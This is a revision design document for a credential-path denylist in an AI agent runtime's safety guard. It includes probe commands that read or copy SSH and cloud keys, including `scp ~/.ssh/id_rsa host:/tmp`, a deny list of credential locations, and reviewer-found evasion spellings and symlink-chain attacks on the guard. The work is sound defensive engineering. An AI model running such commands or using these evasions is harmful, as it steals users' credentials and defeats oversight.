# Master FinHub runtime — OH31 sensitive-path denylist (revision 5)

Add-on to slice 3 (safety). Adopts port-map row OH31 (`references/portmaps/openharness-9b2efd7.md:86`),
source `references/openharness/src/openharness/permissions/checker.py` @ 9b2efd7, MIT, **adapt**
(rewrite with `# adapted from references/openharness/src/openharness/permissions/checker.py:18 (MIT)`).

## Changes in revision 5

Round-4 verdict: `_workspace/07_oh31-denylist_verdict_r4.md` (UPHELD 38 / REJECTED 1: A40). Daniel authorised round 5, scoped to A40 and the listed items. I re-verified both A40 findings and agree with both. I ran the judge's symlink-chain and flat-amplification attacks (ported from its `r4/chain.py` and `r4/symamp.py`) against a new simulation, `scratchpad/sim/sim5.py`, outside the repo. The simulation patches `safety.segment_rule`, `safety._check` and `safety._guard` with the rev-5 rule; `_check_value` and `check_command` are the real, unpatched functions. Python 3.11.15 (`.venv`), 4 cores, no repo writes.

| verdict item | re-check | change | claim ids |
|---|---|---|---|
| A40 (1): symlink targets not charged | Reproduced with `Path.resolve` (mutant `MUT=pathresolve`). `cat ./c0` on the 500-link chain: 0.868 s, `None`. 20 spellings: 18.7 s, `None`. 20 path args: 17.0 s. Flat amplification: 1 word 1.7 s; 11 path args 12.9 s | `Path.resolve` is replaced by `realpath_bounded`, a walk that keeps **one directory fd** and charges **every component it visits, including the components of each symlink target**. It follows at most `MAX_SYMLINKS = 40` symlinks per path (Linux's own limit). Either limit → `path-budget` (deny). The lexical forms are matched **before** any walk. | A40 (CHANGED r5), A42 (new) |
| A40 (1), walking cost | **Found while fixing, not in the verdict:** a walk that calls `lstat` on the whole prefix each time is still O(depth) per component in the kernel. Deep **existing** directories (a 1,000-level tree an earlier call could create with `mkdir -p`) gave 0.50-0.52 s for 30 path args, the same as `Path.resolve`. | The walk uses `os.stat(name, dir_fd=fd, follow_symlinks=False)` and `os.open(name, O_DIRECTORY|O_NOFOLLOW, dir_fd=fd)`, so each component costs O(1) syscalls. After the first missing component, deeper names are appended without syscalls until a `..` climbs back above it. Same deep-tree case: 0.058 s. | A42 |
| A40 (2): `scan=` keyword breaks T41 | Confirmed by reading `tests/test_modes.py:555-556`: the stub `lambda value, policy=None: ""` cannot take `scan=`. My rev-4 simulation never patched `_guard`, so it never exercised that call shape. **The unnamed rev-4 failure was therefore not T41**: T41 could not fail in that simulation. Its cause is unknown; it happened under load and has not recurred in 9 runs since | `check_command`/`check_rule` get **no** new keyword. The `Scan` is shared through a `contextvars.ContextVar`, opened by `_sp.call_scope()` in `_guard` and in `_check(depth=0)`. Only the opener resets it, in `finally`. `_check_value` still calls `check_command(value, policy)` | A41 (new) |
| row 439 | Confirmed: `"./$CLIENT_A_DIRS/"*18` expands to 4,104 > 4,096, so it is not resolved → `None` | Changed to `*17` (simulated: `path-budget`). `*18` is kept as a `None` case that documents the lexical-only band | — |
| Interfaces contradiction / name shadowing | Confirmed: inside `check_rule`/`check_command` the bool parameter `sensitive_paths` shadows the module | Import is `from master_finhub.tools import sensitive_paths as _sp`. All calls are `_sp.<name>`. Only `_check(depth=0)` and `_guard` open the scope; `check_rule` creates nothing. Tests that `monkeypatch.setattr(sensitive_paths, ...)` still work (same module object) | — |
| increment margin | Rev 5: worst best-of-7 increment +0.030 s (1,500 distinct `./N`); `"bash -c "*3 + "a "*4980` +0.006 s. The judge's +0.067 s came from its rev-4 simulation | Check (ii) now **interleaves** on/off runs, 7 each, and compares the minima. The limit stays 0.1 s; margin ≥ 0.07 s on this box | — |

**Rev-5 measurements** (best/worst of 7; inc = best(on) − best(off), interleaved):
| vector | on | off | inc | rule |
|---|---|---|---|---|
| `"bash -c "*3 + "./a "*2490` | 0.133 / 0.230 | 0.132 | +0.002 | `None` |
| `"bash -c "*3 + "~ "*4980` | 0.195 / 0.297 | 0.238 | −0.042 | `None` |
| `"eval "*3 + "./a "*2490` | 0.133 / 0.221 | 0.130 | +0.004 | `None` |
| `"bash -c "*3 + "a "*4980` | 0.202 / 0.283 | 0.196 | +0.006 | `None` |
| `"cat " + "$CLIENT_A_PAD"*700` | 0.008 / 0.009 | 0.008 | +0.000 | `path-too-long` |
| `"bash -c "*3 + "cat " + "$CLIENT_A_PAD "*600` | 0.099 / 0.111 | 0.098 | +0.001 | `None` |
| `"bash -c "*3 + "cat " + "$CLIENT_A_PAD"*600` | 0.007 / 0.009 | 0.097 | −0.090 | `path-too-long` |
| 1,500 distinct `./N` | 0.037 / 0.039 | 0.007 | +0.030 | `None` |
| `cat` + 2,000 × `"./"+"$CLIENT_A_DIRS/"*18+n` | 0.027 / 0.042 | 0.007 | +0.020 | `path-budget` |
| same behind `bash -c ` ×3 | 0.028 / 0.048 | 0.109 | −0.081 | `path-budget` |
| `echo` + `"./$CLIENT_A_DIRS/"*17+n` (row 439 fixed) | 0.028 / 0.034 | 0.007 | +0.021 | `path-budget` |
| `echo` + `"./$CLIENT_A_DIRS/"*18+n` (4,104 expanded) | 0.026 / 0.029 | 0.007 | +0.019 | `None` (lexical only) |
| **symlink chain** (500 links, targets `"x/../"*700+"c{i+1}"`): `cat ./c0` | 0.017-0.027 | — | — | `path-budget` (was 0.87 s / `None`) |
| chain, 20 spellings in one command | 0.018-0.032 | — | — | `path-budget` (was 17.75-18.7 s / `None`) |
| chain, the same 20 as path args | 0.017-0.028 | — | — | `path-budget` (was 17.0-17.4 s) |
| flat amplification (1,300 links to `x/..`×800): 1 word / 11 path args | 0.021-0.029 / 0.018-0.029 | — | — | `path-budget` (was 1.7 s / 12.3-12.9 s) |
| deep existing tree (1,000 levels): 4 spellings in one command / 30 path args / 2,000 paths via a symlink to it | 0.027 / 0.058 / 0.050 | — | — | `None` / `path-budget` / `path-budget` (`Path.resolve`: 0.112 / 0.502 / 4.59 s) |
| path args, 2,000 legit 6-segment paths | 0.041 | — | — | `None` |
| path args, 2,000 × `$CLIENT_A_DIRS`×17 | 0.023 | — | — | `path-budget` |
| symlinked workspace: 3-link chain (`link3 → …/link2/deep`, `link2 → link1/sub`, `link1 → real`), command and path arg | 0.0002-0.0005 | — | — | `None` |
| 39 / 40 / 41-link chain to a regular file | 0.0003 | — | — | `None` / `None` / `path-budget` |
| 2-link loop `a → b → a` | — | — | — | `path-budget` (`Path.resolve` non-strict gives `sensitive-path` via the fail-closed path in this sim) |
| existing `ADVERSARIAL`, worst / first-19 (3 runs) | 0.076-0.093 / 0.456-0.535 | — | — | — |

**Walk equivalence:** on a fixture tree with relative, absolute, dangling and `..`-bearing symlinks, `realpath_bounded(p)` equals `os.path.realpath(p)` on **40,000** random relative and absolute paths. 0 differences.

**Isolation** (simulated):
- Two sequential `guard_tool_call`s, each with 180 *distinct* 51-component paths (9,180 components): `None`, `None`. Under the module-global mutant and the not-reset-ContextVar mutant, the second call gives `path-budget`.
- The same with `check_rule` at budget 6,000 (4,896 components each): `None`, `None` vs `path-budget` under both mutants.
- Two threads × 20 calls, distinct values: all `None` vs `path-budget` under both mutants.

**Existing suites** (`test_safety`, `test_modes_sub`, `test_mcp_client`, `test_docker_engine`, `test_workspace`, `test_modes`), 3 runs: **294 passed, 5 skipped** each time (15.7-16.0 s), including `tests/test_modes.py::test_empty_string_denial_blocks` (T41) unmodified.

## Changes in revision 4 (kept for the audit trail)

Round-3 verdict: `_workspace/07_oh31-denylist_verdict_r3.md` (UPHELD 34 / REJECTED 4). Daniel authorised one extra round. I re-ran every finding against a fresh simulation (`scratchpad/sim/sim4.py`, outside the repo). It monkeypatches `safety.segment_rule` and `safety.check_rule` with the rev-4 rule: the shared `Scan` (memo plus component budget), one combined regex, the caps and the drive split. Runs used `.venv` Python 3.11.15 on 4 cores, host `PATH` 223 chars, with no bytecode or cache writes. All four rejections stand; none is disputed.

| verdict id | re-check | change | claim ids |
|---|---|---|---|
| A31 | Agreed. Prototyped the scan (`scratchpad/sim/astscan.py`). The rev-3 rule (c) flags `Workspace._check`/`MessageBus._check`, and rule (a) misses aliases, `functools.partial` and `getattr` | New scan, described in the test plan. On today's tree plus the planned `client.py` line it reports **no violations**. All 11 negative spellings are flagged: alias `cc(...)`, `partial`, `getattr(safety,"check_rule")(...)`, `=0`, `**{...}`, private import, private attribute, `getattr(safety,"_check")`, dotted-module `_State`, `scan=`, and `client.py` with `=0`. The 3 positives (`self._check`, `bus._check()`, the `client.py` line) are not flagged | A31 (CHANGED r4) |
| A35 | Agreed. Distinct path-like words near 4,096 chars each pay one `resolve`, so the memo cannot help. Measured `resolve` cost is linear in path components: 0.8-2.5 µs per component across four word shapes, about 2 µs per component for `$PATH`-built words | **Per-call component budget** (A40): a top-level call may resolve at most `RESOLVE_COMPONENT_BUDGET = 16_384` path components. The next resolve that would exceed it denies the call with the new rule `path-budget`; nothing is skipped silently. The budget is shared by command words and path arguments within one `_guard` call (one `Scan`). Timing rules are restated (absolute 0.5 s tripwire, plus a same-host increment check < 0.1 s, plus single-level vectors < 0.25 s). The wrong vector expectation is fixed (`None`) | A35 (CHANGED r4), A40 (new) |
| A36 | Agreed. A module-level memo or `lru_cache` survives every rev-3 test. Simulated rev 4: call 1 `cat ./notes.txt` → `None`; `notes.txt` swapped for a symlink to `$HOME/.aws/credentials`; call 2 → `sensitive-path` | Added the two-call symlink-flip test and mutation 11 | A36 (CHANGED r4) |
| A37 | Agreed. The 1.45-1.62 s figure was measured without the memo. With the memo, the per-pattern loop passes | "Load-bearing" and the per-pattern half of mutation 10 are removed. A37 is restated as an implementation choice, pinned by an equivalence test. Simulated: regex result == `any(fnmatchcase(f, p) for p in patterns)` on the corpus | A37 (CHANGED r4) |
| note A20 | Agreed | Verification and the test plan now patch `sensitive_rule` only | A20 (CHANGED r4) |
| note import style | — | `safety.py` does `from master_finhub.tools import sensitive_paths` and **always calls through the module** (`sensitive_paths.sensitive_rule(...)`, `sensitive_paths.Scan()`), so the memo-count and fail-closed tests can patch module attributes. The AST scan allows that import | — |
| note names | — | One name: `sensitive_paths.PATH_MAX_CHARS` (4,096). `MAX_PATH_ARG_CHARS` is gone | — |

**Rev-4 timings (seconds; "on" = `check_rule(v)`, "off" = `check_rule(v, sensitive_paths=False)`, best/worst of 5, each vector cut to 10,000 chars):**
| vector | on | off | on − off (best) | rule |
|---|---|---|---|---|
| `"bash -c "*3 + "./a "*2490` | 0.117 / 0.195 | 0.174 / 0.203 | −0.057 | `None` |
| `"bash -c "*3 + "~ "*4980` | 0.198 / 0.290 | 0.212 / 0.287 | −0.014 | `None` |
| `"eval "*3 + "./a "*2490` | 0.141 / 0.232 | 0.129 / 0.164 | +0.012 | `None` |
| `"bash -c "*3 + "a "*4980` | 0.241 / 0.309 | 0.212 / 0.294 | +0.029 | `None` |
| `"cat " + "$PATH"*1990` | 0.011 / 0.012 | 0.006 / 0.010 | +0.005 | `path-too-long` |
| `"bash -c "*3 + "cat " + "$PATH "*1600` | 0.096 / 0.153 | 0.114 / 0.180 | −0.017 | `None` |
| 1,500 distinct `./N` | 0.039 / 0.064 | 0.007 / 0.008 | +0.032 | `None` |
| `"cat " + " ".join("./"+"$PATH/"*18+str(i) …)` (judge's distinct-word vector) | 0.060 / 0.061 | 0.007 / 0.007 | +0.053 | `path-budget` |
| same behind `bash -c ` ×3 | 0.059 / 0.068 | 0.104 / 0.110 | −0.045 | `path-budget` |
| `"echo " + " ".join("./$PATH/"*18+str(i) …)` | 0.060 / 0.062 | 0.007 / 0.007 | +0.053 | `path-budget` |
| 20 words of `"a/"*400` + n | 0.019 / 0.020 | 0.010 / 0.013 | +0.008 | `None` |
| path args: 2,000 × `"./"+"$PATH/"*18+n` (judge: 5.7 s in rev 3) | 0.058 | — | — | `path-budget` |
| path args: 2,000 × `/workspace/proj/src/modN/fileN.py` | 0.075 | — | — | `None` |
| existing `ADVERSARIAL`, worst / first-19 (3 runs) | 0.073-0.084 / 0.46-0.52 | — | — | — |

The box is noisy, so a negative difference means "within noise". The worst best-of-5 increment is +0.053 s, under the 0.1 s increment limit. The judge's nested vectors on today's code (0.19-0.25 s) are why the absolute limit for nested vectors stays 0.5 s.

Existing suites under the simulation (`test_safety`, `test_modes_sub`, `test_mcp_client`, `test_docker_engine`, `test_workspace`, `test_modes`): **294 passed, 5 skipped** in 6 of 7 runs. One run had 1 failure while the box was loaded (28.4 s wall time against the usual 15.5-16.8 s). The failing test was not captured, and three follow-up runs with `-rf` were clean. I report it rather than hide it: if it recurs at build time, boundary-qa names the test.

## Changes in revision 3 (kept for the audit trail)

Round-2 verdict: `_workspace/07_oh31-denylist_verdict_r2.md` (UPHELD 32 / REJECTED 3). I re-checked each finding by
simulation, not by trusting the verdict. A scratchpad module outside the repo monkeypatches `safety.segment_rule`
and `safety.check_rule` with the rev-3 rule (memo, one combined regex, expanded-length caps, drive-relative split).
Runs used `.venv/bin/python` 3.11.15 on 4 cores, with `PYTHONDONTWRITEBYTECODE=1` and `-p no:cacheprovider`. Nothing
in the repo was written. All three rejections stand. One point is disputed, with numbers: see the A35 row.

| verdict id | re-check | change | claim ids |
|---|---|---|---|
| A33 | Agreed. The rev-2 cap ran before `expandvars`, so a 4,095-char `{"path": "$PATH"*819}` expands to about 182k characters. Command words had no expanded cap at all | Every check now caps the **expanded** string inside the matcher. Path arguments: raw or expanded length > 4,096 → `path-too-long`. Command words: expanded > 10,000 (`MAX_COMMAND_CHARS`) → `path-too-long`; `resolve` runs only when expanded ≤ 4,096. Simulated: `"cat "+"$PATH"*1990` → `path-too-long` in 0.010 s; `{"path": "$PATH"*819}` → `path-too-long` | A33 (CHANGED r3) |
| A35 | Agreed that rev 2 did not bound cost: the rev-2 resolve-only-path-like-words rule plus per-pattern `fnmatchcase` blows up under unquoted nesting. Adopted the judge's fix: a per-call memo plus one compiled regex. My measurements are in the table below | Memo per top-level `check_rule` call (A36); one compiled alternation regex (A37); expanded caps (A33). **Disputed in part:** the 0.25 s limit cannot be the budget for the new nested-unquoted vectors. **Today's** code, before this change, already takes 0.18-0.21 s on `"bash -c "*3 + "a "*4980` (best/worst of 5) because `_inline_rule` re-scans. The new rule adds ≤ 0.07 s on top. The existing test's limits (worst < 0.25 s, first19 < 1.0 s) still pass with margin. The new vectors get their own 0.5 s limit: 2× the measured patched worst, far below rev-2's 2-67 s | A35 (CHANGED r3), A36, A37 (new) |
| D5 | Agreed. Simulated: `K=~/.aws; cat $K/credentials`, `xargs -a ~/.ssh/id_rsa echo` and `env -C ~/.aws cat credentials` → `sensitive-path` with the rule before `strip_wrappers`. These are the cases the judge reports a moved rule lets through | Added the three as tests and as mutation target 8; placement stated as its own claim | A38 (new) |
| note A19 | Agreed: `c:/users/client_a/_netrc` resolves to `<cwd>/c:/users/client_a/_netrc`, which still matches `*/_netrc` | A19 names `{"path": "C:\\Users\\client_a\\.aws\\credentials"}` and `type C:\Users\client_a\.ssh\id_rsa` as the killing tests | A19 (CHANGED r3) |
| note A34 | Agreed: `a:b/.ssh-x` passes (simulated `None`); `.ssh.\id_rsa` is caught by `*/id_rsa` without stripping | False-positive example → `.ssh:notes/x` (simulated `sensitive-path`); stripping test → `C:\Users\client_a\.ssh.\config` | A34 (CHANGED r3) |
| note A17 | Stale cross-reference | → mutation 9 (casefold) | A17 (CHANGED r3) |
| note A15 | `_State` is built in `_check_tokens` | `_check_tokens` added to the threaded functions in Interfaces | — |
| note A31 | Agreed: a spelling test misses `=0`, `**kwargs` and direct `_check` calls | Replaced with an AST scan | A31 (CHANGED r3) |
| N1 | Agreed: `type C:.aws\credentials` passed | **Fixed, not deferred.** A segment-0 `x:rest` is split into `x:` and `rest` before stripping. Simulated: `type C:.aws\credentials`, `type C:.ssh\config` → `sensitive-path`; `cat c:/x`, `scp report.csv host:/tmp/` → `None` | A39 (new) |
| N2 | Agreed for Windows hosts only | "Does not cover" row: Windows hosts unsupported; before supporting them, never `resolve` words starting `\\` or `//` (UNC → outbound SMB) | — |

**Measured timings (seconds, best / worst of 5, 10,000-char cap applied; `base` = today's code):**
| vector | base | rev 3 |
|---|---|---|
| `"bash -c "*3 + "./a "*2490` | 0.121 / 0.166 | 0.168 / 0.176 |
| `"bash -c "*3 + "~ "*4980` | 0.121 / 0.210 | 0.227 / 0.241 |
| `"eval "*3 + "./a "*2490` | 0.100 / 0.102 | 0.177 / 0.184 |
| `"bash -c "*3 + "a "*4980` | 0.179 / 0.217 | 0.215 / 0.282 |
| `"cat " + "$PATH"*1990` | 0.007 / 0.008 | 0.010 / 0.013 (`path-too-long`) |
| `"bash -c "*3 + "cat " + "$PATH "*1600` | 0.097 / 0.121 | 0.122 / 0.168 |
| 1,500 distinct `./N` words | 0.007 / 0.007 | 0.032 / 0.036 |
| existing `ADVERSARIAL` set, worst / first-19 total (3 runs) | 0.073-0.080 / 0.47-0.57 | 0.080-0.119 / 0.63-0.71 |

Existing suites under the simulation (`test_safety`, `test_modes_sub`, `test_mcp_client`, `test_docker_engine`,
`test_workspace`, `test_modes`): **294 passed, 5 skipped**, three runs. Honest margin: first-19 runs at 0.63-0.71 s
against a 1.0 s limit on this box. If a slower CI host breaks it, boundary-qa reports it. Nobody raises the limit
silently.

## Changes in revision 2 (kept for the audit trail)

Round-1 verdict: `_workspace/07_oh31-denylist_verdict.md` (UPHELD 27 / REJECTED 7). Each finding was re-checked
against the code before changing anything; all seven stand.

| verdict id | re-check (what I opened / ran) | change | claim ids |
|---|---|---|---|
| A15 | `token_streams` of `bash -c 'cat ~/.a"w"s/credentials'` gives one word `cat ~/.a"w"s/credentials` in both streams, so a word-level scan misses it. `_inline_rule` (safety.py:285-296) re-runs `_check` on the payload, and POSIX lexing of the payload gives `~/.aws/credentials` | Sensitive matching becomes a **rule inside `segment_rule`** (safety.py:299). It inherits `_check`'s recursion into `-c`, `/c`, `-Command` and `eval` payloads and its loop over both streams. `sensitive_in_command` is withdrawn | A15 (changed) |
| A19 | Agreed: `Path("a/../../.ssh/id_rsa").resolve()` still contains `/.ssh/`. A Windows path argument resolves to `<cwd>/C:\Users\...`, which no pattern matches | Killing test is now the Windows path argument; new mutation target "resolved form only" | A19 (changed) |
| A30 | Agreed: not falsifiable | Withdrawn; the "Does not cover" table carries the scope | A30 (WITHDRAWN) |
| D1 | `mcp/client.py:149` `check_command(shlex.join(self._server.command))`; `docker_engine.py:123` `check_command(command, self._policy)`. `StdioServer` (client.py:70) is built only by Python callers; no loader reads it from a file or from model output | MCP launch opts out with a keyword (`sensitive_paths=False`). The docker engine keeps the default (on). Both are tested | A31, A32 (new) |
| D2 | Measured `resolve` cost on this box: 4,096-char path 0.004 s, 10k-char path 0.016 s; the judge measured 4.5 s at 400k. Path values have no cap today (`_guard` :546-565) | A path argument longer than 4,096 characters is denied (new rule `path-too-long`) before expanding or resolving | A33 (new) |
| D3 | The rev-1 lexical form keeps `_netrc.`, `_netrc::$DATA` and `.git-credentials.` intact, and end-anchored patterns miss them | The lexical form strips any `:stream` suffix and any trailing dots or spaces from each segment (except `.` and `..`). 8.3 short names are added to "Does not cover" | A34 (new) |
| D4 | Agreed: every rev-1 command case is also caught by the non-POSIX stream; the allowlist loop named no strings; the write direction was untested | Added POSIX-only cases, pinned allowlist cases with the path in last position, and write-direction cases | test plan only (A15, A21 verifications) |
| A29 note | `run_team(..., guard: ToolGuard = guard_tool_call)` (team.py:567) replaces the guard when passed | Added to "Callers that bypass" | — |
| knock-on | The rev-1 A21 text said the check sits *after* `check_rule`; it now runs *inside* `check_rule` (:519) | A21 wording changed; the ordering argument is unchanged | A21 (changed) |
| knock-on | Resolving every command word costs about 0.06 s per 5,000 identical one-letter words per stream (measured). `test_adversarial_inputs_are_linear` (tests/test_safety.py:220) allows 0.25 s worst case, and nesting multiplies the scans | In commands, only words that contain `/` or `\`, or start with `~`, `.` or `$`, are resolved; every word gets the lexical form | A35 (new) |

## Findings from the code (decides net-new vs already covered)

Read in full: `src/master_finhub/tools/safety.py` (573 lines), `src/master_finhub/sandbox/workspace.py`,
`src/master_finhub/tools/builtins/{echo,__init__}.py`, `runtime/loop.py` (ToolCall :30, ToolGuard :141,
`_execute` guard call :221, `_uncertain` :208), `tests/test_safety.py`, `tests/test_workspace.py`, plus the
guard call sites, `tools/mcp/client.py` (`StdioServer` :70, `start` :146-151, `McpTool` :408) and
`sandbox/docker_engine.py` (`docker_argv` :94-107, `DockerEngine.stream` :121-125, `SandboxExecTool` :143).

1. **Is credential-path denial net-new? Yes.** Probed on the current tree (scratch run, no files written):
   `check_command(c)` returns `None` in default mode **and** with
   `CommandPolicy(mode="allowlist", allowed_commands={"cat","cp","scp","rsync","tar","base64","git","grep"})` for every one of
   `cat ~/.ssh/id_rsa`, `cat $HOME/.aws/credentials`, `cp -r ~/.aws /workspace/x`, `tar czf /workspace/k.tgz ~/.ssh`,
   `base64 ~/.ssh/id_ed25519`, `git -C ~/.ssh status`, `scp ~/.ssh/id_rsa host:/tmp`, `grep -r KEY ~/.aws`;
   and `guard_tool_call(ToolCall("1","mcp_read",{"path":"/root/.ssh/id_rsa"}))` returns `None`.
   Why: `safety._guard` (:546-565) only inspects values under `COMMAND_ARG_KEYS` (:30) and `check_rule` has no
   read/exfiltration rule — it targets destruction only (RULE_REASONS :125-149).
2. **Does the workspace fence already block `~/.ssh` for file tools? Only where it is used, and no agent-facing tool uses it.**
   `tools/builtins` contains only `echo` (no path args). `Workspace` is used by `CheckpointStore` (`cli.py:57`) and
   `evals/runner.py:145` with runtime-chosen paths, never model-supplied ones. Model-supplied paths reach the host
   through `McpTool.run` (`mcp/client.py:421`), which forwards arguments verbatim and is never fenced. Even where the
   fence is used it has three credential holes: `fence_reads=False` reads the raw path (`workspace.py:165`);
   `extra_read_roots` containing `$HOME` makes `~/.ssh` readable (`:109-110`, `:138`); and a workspace at or above
   `$HOME`, or a `.ssh` folder inside the workspace, is inside the fence (`:136-138`).
   The docker engine binds only the workspace (`docker_engine.py:104`), so in-container commands cannot see host
   `~/.ssh` unless the workspace *is* home — the denylist is defence in depth there, and the only layer for MCP tools.
3. **One hook point covers every runtime, plus two direct `check_command` callers.** All guarded call sites use
   `guard_tool_call` or `make_guard`: `cli.py:133`, `server/app.py:339`, `orchestration/modes/subagent.py:233`,
   `orchestration/modes/team.py:567`, `evals/runner.py:151`; tests use `make_guard` (`tests/test_modes_sub.py:344`).
   Sub-guards compose with `_both` (`subagent.py:111-118`): parent first, extra can only add denials.
   `check_command` is also called directly in two places, and the change reaches both:
   - `mcp/client.py:149` checks the **MCP server launch argv** (`StdioServer.command`, operator-written Python config).
     Decision: **opt out** (`check_command(..., sensitive_paths=False)`). A launch line such as
     `kube-mcp --kubeconfig ~/.kube/config` or `aws-mcp --config ~/.aws/config` is a legitimate operator choice: the
     server exists to use those credentials, and the model never writes this argv. The destructive rules still apply
     (`test_denied_launch_command_never_spawns`, tests/test_mcp_client.py:171, stays green). A31.
   - `docker_engine.py:123` checks **every in-container command**, including those from `SandboxExecTool` (:143,
     model-supplied `command`). Decision: **keep it on** (the default). The guard already denied these commands
     before the tool ran. The engine-level check also covers direct `DockerEngine.run/stream` callers and the case
     where the workspace bind mount (:104) is home. A32.

## OH31 — sensitive-path denylist (slice 3 add-on)

### Goal
Daniel's agent asks any tool to read or write `~/.ssh/id_rsa` (as a `path` argument or inside a shell command,
including a nested `bash -c '...'`) and gets `Blocked by safety policy (rule sensitive-path) ...`, whatever the
command policy or mode.

### Files
| path | new/modified |
|---|---|
| src/master_finhub/tools/sensitive_paths.py | new (path matcher, `Scan`, `call_scope` ContextVar, `realpath_bounded`; target ≤ 120 lines) |
| src/master_finhub/tools/safety.py | modified (+~30 lines: `from master_finhub.tools import sensitive_paths as _sp`, `PATH_ARG_KEYS`, three `RULE_REASONS` rows, `_State.sensitive`, one rule at the top of `segment_rule` (reads `_sp.current_scan()`), the `sensitive` flag threaded through `check_command` → `check_rule` → `_check` → `_check_tokens` (builds `_State`) → `segment_rule` → `_inline_rule` → `_check`, `with _sp.call_scope():` around `_check(depth=0)` and around `_guard`'s body, the path-key branch in `_guard`; no new keyword on `check_command`/`check_rule`) |
| src/master_finhub/tools/mcp/client.py | modified (one line, :149: `sensitive_paths=False`) |
| tests/test_sensitive_paths.py | new |

`sandbox/docker_engine.py` is unchanged: it inherits the default.

**Why one new module plus a safety.py extension.** The matcher (patterns, normalise, resolve, fail-closed) has no
dependency on shell lexing and is reusable by a future file tool, so it gets its own module (safety.py is already
573 lines; slice-design rule "safety slices are small"). The command side must be a rule **inside**
`segment_rule`, because that is the only place that sees nested payloads (`_inline_rule` :285 → `_check` at
depth+1) and both token streams (`_check` :482-485). A separate pre-scan would have to duplicate that recursion,
which was the rev-1 bug. The judge confirmed `sensitive_paths.py` imports nothing from `master_finhub`, so there is
no cycle.

### Interfaces
```python
# src/master_finhub/tools/sensitive_paths.py
SENSITIVE_PATH_PATTERNS: Final[tuple[str, ...]]   # lower-case fnmatch patterns, see table below

PATH_MAX_CHARS: Final = 4096                      # Linux PATH_MAX; the ONLY name for this limit (safety.py uses it too)
RESOLVE_COMPONENT_BUDGET: Final = 16_384          # path components the walk may visit per top-level call, symlink-target components included (A40)
MAX_SYMLINKS: Final = 40                          # symlinks followed per path, = Linux MAXSYMLINKS (A40)

class BudgetExceeded(Exception): ...              # raised by realpath_bounded; sensitive_rule turns it into 'path-budget'

_SCAN: Final[contextvars.ContextVar[Scan | None]] = contextvars.ContextVar("oh31_scan", default=None)

def current_scan() -> Scan | None: ...            # _SCAN.get()

@contextlib.contextmanager
def call_scope() -> Iterator[Scan]:
    """If a Scan is current, yield it (nested use: not owned). Otherwise set a fresh Scan, yield it, and
    reset the ContextVar token in `finally`. Only the opener resets. New threads start with no Scan (A41)."""

def realpath_bounded(path: str, scan: Scan) -> str:
    """POSIX realpath(strict=False) computed with one directory fd (os.stat/os.open/os.readlink with dir_fd).
    Charges 1 to scan.components_left for every component visited, including every component of every
    symlink target and of the cwd prefix for relative paths. Follows at most MAX_SYMLINKS symlinks.
    After the first missing component, later names are appended without syscalls until '..' climbs above
    it. Raises BudgetExceeded when either limit is passed (A40, A42)."""
_PATTERN_RE: Final[re.Pattern[str]]               # ONE compiled alternation of fnmatch.translate(p) for all patterns (A37)

@dataclass
class Scan:
    """Per-top-level-call state, reached only through call_scope()/current_scan(). Never stored at module
    level, never cached across calls (A36, A41)."""
    cmd: dict[str, str | None] = field(default_factory=dict)    # command word -> rule
    path: dict[str, str | None] = field(default_factory=dict)   # path-argument value -> rule
    components_left: int = field(default_factory=lambda: RESOLVE_COMPONENT_BUDGET)  # read at construction

def match_forms(expanded: str, *, resolve: bool = True) -> tuple[str, ...]:
    """Lexical form (and, if resolve, the resolved form) of an already-expanded string, each casefolded,
    '/'-rooted, with and without a trailing '/'. May raise (OSError, ValueError, RuntimeError)."""

def sensitive_rule(raw: str, *, resolve: bool = True, max_chars: int = PATH_MAX_CHARS) -> str | None:
    """Order: caps -> expand -> caps -> LEXICAL forms matched first ('sensitive-path' on a hit, no walk) ->
    if resolve and the expansion <= PATH_MAX_CHARS: realpath_bounded(expansion, current_scan() or Scan())
    ('path-budget' on BudgetExceeded) and its forms matched. Does NOT read or write scan.cmd / scan.path
    (callers memoise). Any other exception -> 'sensitive-path'."""

def is_sensitive_path(raw: str, *, resolve: bool = True) -> bool:
    """sensitive_rule(raw, resolve=resolve) is not None."""

# src/master_finhub/tools/safety.py (additions / changed signatures)
from master_finhub.tools import sensitive_paths as _sp  # always _sp.<name>(...): the bool parameter `sensitive_paths`
                                                        # of check_rule/check_command would shadow the plain module name
PATH_ARG_KEYS: Final[frozenset[str]]              # casefolded key names, see A23
RULE_REASONS["sensitive-path"] = ("touches a credential or key location (SSH, cloud, registry or "
                                  "token files); ask Daniel to handle credentials manually")
RULE_REASONS["path-too-long"] = ("a path or command word is longer than its limit after expanding ~ and "
                                 "$VARS (4,096 for path arguments, 10,000 in commands) and was not inspected")
RULE_REASONS["path-budget"] = ("the call names more path components than can be inspected at once "
                               "(16,384); split it into smaller calls")

@dataclass
class _State:
    depth: int
    sensitive: bool = True                         # new
    # (no scan field: the Scan is reached via _sp.current_scan(), A41)
    cwd_root: bool = False
    downloaded: set[str] = field(default_factory=set)

def check_rule(command: str, *, sensitive_paths: bool = True) -> str | None: ...
def check_command(command: str, policy: CommandPolicy = DEFAULT_POLICY, *,
                  sensitive_paths: bool = True) -> str | None: ...
# No `scan` keyword anywhere: _check_value keeps calling check_command(value, policy), so stubs with the
# old two-argument shape (tests/test_modes.py:555) keep working (A41).
# internal: _check(command, depth=0, sensitive=True) -> at depth 0 runs inside `with _sp.call_scope():`
#           (the ONLY place besides _guard that opens a scope; check_rule itself creates nothing)
#           _check_tokens(tokens, depth, sensitive)  -> _State(depth, sensitive)
#           _inline_rule(name, args, depth, sensitive) -> _check(payload, depth + 1, sensitive)
#           _guard(call, policy) -> body runs inside `with _sp.call_scope() as scan:`

# unchanged signatures, changed behaviour:
def guard_tool_call(call: ToolCall) -> str | None: ...
def make_guard(policy: CommandPolicy) -> ToolGuard: ...
```
`sensitive_paths=False` is a keyword for code callers only. No `CommandPolicy` field, config value, tool argument
or model output reaches it. The only caller that passes it is `mcp/client.py:149` (A31).

### Pattern list
| pattern | origin | claim |
|---|---|---|
| `*/.ssh/*` | ported | A2 |
| `*/.aws/*` | ported `*/.aws/credentials` + `*/.aws/config`, widened to the whole dir | A3, A16 |
| `*/.config/gcloud/*` | ported | A4 |
| `*/.azure/*` | ported | A5 |
| `*/.gnupg/*` | ported | A6 |
| `*/.docker/config.json`, `*/.docker` (dir itself, not its children) | ported + dir root | A7, A16 |
| `*/.kube/config`, `*/.kube` (dir itself) | ported + dir root | A8, A16 |
| `*/.netrc`, `*/_netrc` | extension | A24 |
| `*/.npmrc` | extension | A25 |
| `*/.pypirc` | extension | A26 |
| `*/.git-credentials` | extension | A27 |
